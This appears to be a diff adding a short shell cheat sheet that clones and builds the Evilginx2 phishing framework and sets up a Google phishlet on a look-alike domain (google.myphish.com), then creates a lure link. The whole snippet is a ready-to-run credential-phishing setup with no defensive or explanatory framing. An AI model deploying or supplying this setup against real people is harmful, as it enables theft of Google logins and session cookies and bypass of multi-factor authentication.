@@ -1,0 +1,16 @@
+# ================= Evilginx2 =================
+# Clone and build Evilginx2
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+make
+
+# Run Evilginx2
+sudo ./bin/evilginx
+
+# Configure a phishlet
+phishlets hostname google google.myphish.com
+phishlets enable google
+
+# Launch and link phishlet
+lures create google
+lures get-url 0
